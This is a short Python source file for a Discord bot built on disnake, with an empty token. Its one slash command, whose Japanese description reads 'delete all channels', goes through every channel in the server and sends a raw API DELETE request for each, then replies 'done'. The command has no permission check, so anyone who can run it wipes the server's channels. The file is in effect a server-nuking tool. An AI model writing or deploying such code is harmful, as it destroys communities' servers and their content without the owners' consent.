import disnake,requests,os
from disnake.ext import commands

token=""
intents = disnake.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.slash_command(description="全チャンネルを削除")
async def del_ch(ctx):
  for i in ctx.guild.channels:
    headers={"Authorization":"Bot "+token}
    requests.delete(f'https://discord.com/api/v9/channels/{i.id}',headers=headers)
  await ctx.send("完了。",ephemeral=True)


bot.run(token)
